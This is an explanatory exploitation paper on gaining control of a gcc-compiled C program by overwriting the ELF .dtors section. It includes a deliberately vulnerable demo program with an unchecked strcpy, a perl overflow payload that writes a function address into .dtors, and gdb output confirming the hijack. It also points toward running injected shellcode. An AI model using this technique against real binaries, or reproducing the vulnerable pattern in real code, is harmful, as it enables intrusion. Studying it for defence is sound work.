                        Overwriting the .dtors section.

Introduction
------------

        This paper presents a concise explanation of a technique to gain
control of a C program's flow of execution given that it has been compiled with
gcc. This text assumes that the reader is familiar with general overflow
techniques and the ELF format.

        ga and dvorak for interesting discussion.

Overview
--------

        gcc provides several types of attributes for functions, particularly
there are two which will be of special interest for us: constructors and
destructors. These attributes should be specified by the programmer in a way
similar to this:

             static void start(void) __attribute__ ((constructor));
              static void stop(void) __attribute__ ((destructor));

        Functions with the `constructor' attribute will be executed before
main() while those declared with the `destructor' attribute will be executed
just _after_ main() exits.
        In the produced ELF executable image this will be represented as two
different sections: .ctors and .dtors. Both of them will have the following
layout:

    0xffffffff <function address> <another function address> ... 0x00000000

        NOTE: If you want to really know everything about this I recommend you
to launch your favourite editor on gcc-2.95.2/gcc/collect2.c

        From this point there are several things to take into account:

        * .ctors and .dtors will be mapped in memory in the process' address
space and will be writable by default.
        * These sections won't go away after a normal strip(1) of the binary.
        * We don't care whether the programmer has set up any function as
either a constructor or destructor because both sections will appear anyway and
be mapped in memory.

The gory details
----------------

        It's perhaps time to demonstrate the previous statements. There we
go...

$ cat > yopta.c <<EOF
#include <stdio.h>
#include <stdlib.h>

static void start(void) __attribute__ ((constructor));
static void stop(void) __attribute__ ((destructor));

int
main(int argc, char *argv[])
{
        printf("start == %p\n", start);
        printf("stop == %p\n", stop);

        exit(EXIT_SUCCESS);
}

void
start(void)
{
        printf("hello world!\n");
}

void
stop(void)
{
        printf("goodbye world!\n");
}

EOF
$ gcc -o yopta yopta.c
$ ./yopta
hello world!
start == 0x8048480
stop == 0x80484a0
goodbye world!
$ objdump -h yopta
                                       .
                                       .
                                       .
 14 .data         0000000c  08049558  08049558  00000558  2**2

                                       .
                                       .
                                       .
$ objdump -s -j .dtors yopta

yopta:     file format elf32-i386

Contents of section .dtors:
 8049574 ffffffff a0840408 00000000           ............

        As we can see the address of stop() is stored in the .dtors as it was
previously said. Our aim here is the exploitation of a program, thus we will
forget from now on about .ctors since we'll not be able to do anything useful
with it.

        We'll try now with a normal program without these function attributes:

$ cat > bleh.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

static void bleh(void);

int
main(int argc, char *argv[])
{
        static u_char buf[] = "bleh";

        if (argc < 2)
                exit(EXIT_FAILURE);

        strcpy(buf, argv[1]);

        exit(EXIT_SUCCESS);
}

void
bleh(void)
{
        printf("goffio!\n");
}
EOF
$ gcc -o bleh bleh.c
$ ./bleh
$ objdump -h bleh
                                       .
                                       .
                                       .
 17 .dtors        00000008  0804955c  0804955c  0000055c  2**2
                  CONTENTS, ALLOC, LOAD, DATA
                                       .
                                       .
                                       .

        Good! .dtors is still there even when there are no functions flagged as
destructors. Now we take a look at its contents:

$ objdump -s -j .dtors bleh

bleh:     file format elf32-i386

Contents of section .dtors:
 804955c ffffffff 00000000                    ........

        Only the head and tail tags are present but there are no function
addresses specified.

        Maybe it seems odd to see buf declared as both static and initialized.
By doing so we make it be stored in the .data section which is very near to
our target .dtors section. Thus we'll be able to reach our objective easily by
overflowing buf. This is not the only avenue we can take to write into that
place, virtually every method you can come up with to write into the process'
address space will be useful (format string attack, direct strcpy by returning
into libc, corrupting a malloc chunk, ...) The one used here was chosen due to
its simplicity.

        The goal now is to be able to execute the code present in bleh() (which
never gets called under normal conditions) by making an entry in .dtors that
points to it. We must leave the head tag alone and overwrite the tail tag (the
0x00000000) to achieve it.

$ objdump --syms bleh | egrep 'text.*bleh'
080484b0 l     F .text  0000001a              bleh

        So as we can see bleh() is placed at 0x080484b0. It's time for an
exploit.

$ ./bleh `perl -e 'print "A" x 24; print "\xb0\x84\x04\x08";'`
goffio!
Segmentation fault (core dumped)

        The test worked as we expected, but perhaps it is better to double
check and see the corpse of our process and what was changed.

                                       .

        Now we want to examine what was overwritten.

(gdb) x/x 0x08049550
0x8049550 <force_to_data>:      0x41414141

        These are the contents of the .eh_frame (used by gcc to store the
exception handler pointers for languages that support them).

(gdb) x/x 0x08049554
0x8049554 <__CTOR_LIST__>:      0x41414141
(gdb) x/8x 0x0804955c
0x804955c <__DTOR_LIST__>:      0x41414141      0x080484b0      0x08049500     
 0x40013ed0
0x804956c <_GLOBAL_OFFSET_TABLE_+8>:    0x4000a960      0x400fb550      0x08048
336      0x400338cc
(gdb)

        As we can see, we didn't take any care as to place the 0xfffffff head
tag in it's appropriate place and it turned out not to be needed at all, just
by putting bleh()'s address into the right position we made the code be
executed.  We can also notice that the process segfaults after _fini(), this is
obviously because it keeps searching for the non-existent tail tag (0x00000000)
and jumping into every address just after ours (those found in the Global
Offset Table). 

Conclusion
----------

        An alternative way to launch an injected piece of shellcode has been
shown. The technique provides some advantages:

        * If the target binary is readable by the attacker it will be very
easy to determine the exact position where we want to write and point to our
shellcode, just by analyzing the ELF image and determining .dtors position will
be enough. In this circumstance the reliability of the exploit is usually
drastically increased.
        * It is simpler than other techniques like overwriting an entry in the
Global Offset Table.

        ...and disadvantages:

        * Requires that the victim program has been compiled and linked with
GNU tools.
        * Under some circumstances it may be difficult to find a place to store
the shellcode until the program exit()s.

        Have fun! :)
